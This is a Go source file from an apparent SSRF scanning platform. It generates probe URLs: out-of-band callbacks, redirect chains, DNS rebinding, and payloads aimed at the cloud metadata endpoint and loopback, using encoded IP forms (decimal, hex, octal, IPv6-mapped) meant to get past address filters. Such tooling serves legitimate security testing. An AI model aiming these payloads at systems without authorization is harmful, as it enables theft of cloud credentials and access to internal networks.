// Package payload turns one job context into the full matrix of SSRF probe
// variants: plain OOB callbacks, controlled redirects, DNS rebinding and the
// address-deformation / cloud-metadata family.
//
// Every variant URL carries the job's self-describing token, so whichever
// variant eventually triggers a callback, attribution is exact.
package payload

import (
	"fmt"
	"net/url"
	"strconv"
	"strings"

	"ssrf-platform/internal/token"
	"ssrf-platform/internal/types"
)

// Config tells the generator where the OOB infrastructure lives.
type Config struct {
	Domain         string // apex domain, e.g. oob.example.net
	Secret         []byte
	HTTPPort       int // 0 / 80 means omitted from URLs
	HTTPSPort      int
	PublicIP       string // collector's public IP (first rebind answer)
	MetadataIP     string // default 169.254.169.254
	InternalTarget string // default 127.0.0.1
}

// Generator builds variant sets.
type Generator struct{ cfg Config }

// New constructs a generator with defaults filled in.
func New(cfg Config) *Generator {
	cfg.Domain = strings.TrimSuffix(strings.ToLower(cfg.Domain), ".")
	if cfg.MetadataIP == "" {
		cfg.MetadataIP = "169.254.169.254"
	}
	if cfg.InternalTarget == "" {
		cfg.InternalTarget = "127.0.0.1"
	}
	return &Generator{cfg: cfg}
}

type def struct {
	id          string
	class       types.VariantClass
	description string
	intranet    bool
	build       func(host, flat, markerURL, redirectBase string) string
	hostname    bool // variant's primary signal is DNS resolution
}

// Config returns the generator's configuration.
func (g *Generator) Config() Config { return g.cfg }

// Build returns every safe (OOB-only) variant for the context. Intranet
// variants are appended when includeIntranet is true ("full" scan mode).
func (g *Generator) Build(c types.JobContext, includeIntranet bool) []types.Variant {
	specs := g.variantDefs(includeIntranet)
	out := make([]types.Variant, 0, len(specs))
	for _, d := range specs {
		vc := c
		vc.VariantID = d.id
		dnsName := token.DNSName(vc, g.cfg.Domain, g.cfg.Secret)
		flat := g.VariantToken(c, d.id)
		httpBase := "http://" + g.hostPort(g.cfg.HTTPPort, 80)
		httpsBase := "https://" + g.hostPort(g.cfg.HTTPSPort, 443)
		v := types.Variant{
			ID:          d.id,
			Class:       d.class,
			Description: d.description,
			Intranet:    d.intranet,
			Hostname:    dnsName,
		}
		switch d.id {
		case "dns-only":
			// Schemed so HTTP clients actually attempt resolution; the only
			// guaranteed signal remains the DNS look-up itself.
			v.URL = "http://" + dnsName + ":" + strconv.Itoa(effectivePort(g.cfg.HTTPPort, 80)) + "/"
		case "oob-https":
			v.URL = httpsBase + "/p/" + flat
		case "redirect-1hop", "redirect-3hop":
			hops := 1
			if d.id == "redirect-3hop" {
				hops = 3
			}
			v.URL = httpBase + "/r/" + flat + "?hops=" + strconv.Itoa(hops)
		case "redirect-to-metadata":
			v.URL = httpBase + "/r/" + flat + "?hops=1&to=" + url.QueryEscape("http://"+g.cfg.MetadataIP+"/")
		case "redirect-to-internal":
			v.URL = httpBase + "/r/" + flat + "?hops=1&to=" + url.QueryEscape("http://"+g.cfg.InternalTarget+"/")
		case "rebind-first-public":
			v.URL = "http://" + dnsName + ":" + strconv.Itoa(effectivePort(g.cfg.HTTPPort, 80)) + "/p/" + flat
		case "url-userinfo-confusion":
			v.URL = "http://allowed@" + g.hostPort(g.cfg.HTTPPort, 80) + "/p/" + flat
		default:
			v.URL = d.build(dnsName, flat, httpBase+"/p/"+flat, httpBase+"/r/"+flat)
		}
		out = append(out, v)
	}
	return out
}

func (g *Generator) hostPort(port, defPort int) string {
	if port == 0 || port == defPort {
		return g.cfg.Domain
	}
	return fmt.Sprintf("%s:%d", g.cfg.Domain, port)
}

func effectivePort(port, defPort int) int {
	if port == 0 {
		return defPort
	}
	return port
}

func (g *Generator) variantDefs(includeIntranet bool) []def {
	safe := []def{
		{id: "oob-http", class: types.ClassOOB, description: "direct HTTP callback to OOB collector",
			build: func(host, flat, markerURL, _ string) string { return markerURL }},
		{id: "oob-https", class: types.ClassOOB, description: "direct HTTPS callback to OOB collector"},
		{id: "dns-only", class: types.ClassOOB, hostname: true, description: "bare hostname, DNS resolution is the only signal"},
		{id: "redirect-1hop", class: types.ClassRedirect, description: "one same-trust redirect before the marker page"},
		{id: "redirect-3hop", class: types.ClassRedirect, description: "three-hop redirect chain before the marker page"},
		{id: "rebind-first-public", class: types.ClassRebind, description: "DNS rebind: first A answer public, later answers internal (1s TTL)"},
		{id: "url-userinfo-confusion", class: types.ClassOOB, description: "userinfo@host parser confusion against the OOB domain"},
	}
	if !includeIntranet {
		return safe
	}
	meta := g.cfg.MetadataIP
	intra := g.cfg.InternalTarget
	intranet := []def{
		{id: "redirect-to-metadata", class: types.ClassRedirect, intranet: true,
			description: "OOB-confirmed redirect that lands on the cloud metadata endpoint"},
		{id: "redirect-to-internal", class: types.ClassRedirect, intranet: true,
			description: "OOB-confirmed redirect that lands on an internal RFC1918/loopback target"},
		{id: "metadata-direct", class: types.ClassIntranet, intranet: true,
			description: "GET " + meta + "/ (cloud metadata, raw IPv4)",
			build:       func(_, _, _, _ string) string { return "http://" + meta + "/" }},
		{id: "metadata-aws-path", class: types.ClassIntranet, intranet: true,
			description: "AWS-style metadata path",
			build:       func(_, _, _, _ string) string { return "http://" + meta + "/latest/meta-data/" }},
		{id: "metadata-decimal", class: types.ClassIntranet, intranet: true,
			description: "metadata IP as a single decimal integer",
			build:       func(_, _, _, _ string) string { return "http://" + ipToDecimal(meta) + "/" }},
		{id: "metadata-hex", class: types.ClassIntranet, intranet: true,
			description: "metadata IP in hexadecimal notation",
			build:       func(_, _, _, _ string) string { return "http://" + ipToHex(meta) + "/" }},
		{id: "metadata-octal", class: types.ClassIntranet, intranet: true,
			description: "metadata IP in octal notation",
			build:       func(_, _, _, _ string) string { return "http://" + ipToOctal(meta) + "/" }},
		{id: "metadata-v6mapped", class: types.ClassIntranet, intranet: true,
			description: "metadata IP as IPv4-mapped IPv6 address",
			build:       func(_, _, _, _ string) string { return "http://[" + v4Mapped(meta) + "]/" }},
		{id: "internal-loopback", class: types.ClassIntranet, intranet: true,
			description: "loopback " + intra + " raw",
			build:       func(_, _, _, _ string) string { return "http://" + intra + "/" }},
		{id: "internal-shorthand-127.1", class: types.ClassIntranet, intranet: true,
			description: "loopback shorthand 127.1",
			build:       func(_, _, _, _ string) string { return "http://127.1/" }},
		{id: "internal-all-zeros", class: types.ClassIntranet, intranet: true,
			description: "0.0.0.0, which many stacks resolve to localhost",
			build:       func(_, _, _, _ string) string { return "http://0.0.0.0/" }},
		{id: "internal-ipv6-loopback", class: types.ClassIntranet, intranet: true,
			description: "IPv6 loopback [::1]",
			build:       func(_, _, _, _ string) string { return "http://[::1]/" }},
		{id: "internal-decimal", class: types.ClassIntranet, intranet: true,
			description: "loopback as decimal integer",
			build:       func(_, _, _, _ string) string { return "http://" + ipToDecimal(intra) + "/" }},
		{id: "internal-octal", class: types.ClassIntranet, intranet: true,
			description: "loopback in octal notation",
			build:       func(_, _, _, _ string) string { return "http://" + ipToOctal(intra) + "/" }},
	}
	return append(safe, intranet...)
}

// VariantToken returns the flat token embedded in one specific variant. The
// scanner MUST use this exact token as the job token so that OOB events
// carrying it correlate back to the job.
func (g *Generator) VariantToken(c types.JobContext, variantID string) string {
	vc := c
	vc.VariantID = variantID
	return token.Encode(vc, g.cfg.Secret)
}

// RebindToken returns the flat token for a rebind variant so the caller can
// register the DNS plan before injecting the payload.
func (g *Generator) RebindToken(c types.JobContext) string {
	return g.VariantToken(c, "rebind-first-public")
}

// RebindName returns the full DNS name for the rebind variant.
func (g *Generator) RebindName(c types.JobContext) string {
	vc := c
	vc.VariantID = "rebind-first-public"
	return token.DNSName(vc, g.cfg.Domain, g.cfg.Secret)
}

// ---- address deformation helpers -------------------------------------------

func ipToDecimal(ip string) string {
	parts := splitV4(ip)
	if len(parts) != 4 {
		return ip
	}
	n := uint64(parts[0])<<24 | uint64(parts[1])<<16 | uint64(parts[2])<<8 | uint64(parts[3])
	return strconv.FormatUint(n, 10)
}

func ipToHex(ip string) string {
	parts := splitV4(ip)
	if len(parts) != 4 {
		return ip
	}
	return fmt.Sprintf("0x%02x%02x%02x%02x", parts[0], parts[1], parts[2], parts[3])
}

func ipToOctal(ip string) string {
	parts := splitV4(ip)
	if len(parts) != 4 {
		return ip
	}
	out := make([]string, 4)
	for i, p := range parts {
		out[i] = "0" + strconv.FormatUint(p, 8)
	}
	return strings.Join(out, ".")
}

func v4Mapped(ip string) string {
	parts := splitV4(ip)
	if len(parts) != 4 {
		return "::ffff:" + ip
	}
	return fmt.Sprintf("::ffff:%02x%02x:%02x%02x", parts[0], parts[1], parts[2], parts[3])
}

func splitV4(ip string) []uint64 {
	raw := strings.Split(ip, ".")
	if len(raw) != 4 {
		return nil
	}
	out := make([]uint64, 4)
	for i, r := range raw {
		n, err := strconv.ParseUint(r, 10, 8)
		if err != nil {
			return nil
		}
		out[i] = n
	}
	return out
}
